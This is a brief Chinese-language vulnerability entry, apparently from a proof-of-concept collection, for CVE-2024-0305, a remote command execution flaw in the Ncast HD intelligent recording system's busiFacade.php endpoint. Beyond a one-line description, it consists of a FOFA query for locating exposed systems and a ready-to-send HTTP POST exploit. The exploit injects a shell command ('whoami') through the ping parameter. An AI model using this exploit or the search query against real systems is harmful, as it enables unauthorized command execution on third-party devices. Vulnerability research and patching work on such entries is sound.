## Ncast盈可视高清智能录播系统存在RCE漏洞(CVE-2024-0305)

Ncast盈可视高清智能录播系统是广州盈可视电子科技有限公司的一款产品。Ncast盈可视高清智能录播系统/classes/common/busiFacade.php接口存在RCE漏洞，攻击者可以利用此漏洞执行任意命令。


## fofa
```
app="Ncast-产品" && title=="高清智能录播系统"
```

## poc
```
POST /classes/common/busiFacade.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
Connection: close
Content-Length: 146
Accept: */*
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest

%7B%22name%22:%22ping%22,%22serviceName%22:%22SysManager%22,%22userTransaction%22:false,%22param%22:%5B%22ping%20127.0.0.1%20%7C%20whoami%22%5D%7D
```

![052fb9df8c276d297193cd5a59c56fad](https://github.com/wy876/POC/assets/139549762/de0f032c-0ce2-4308-8987-ecd93142d133)
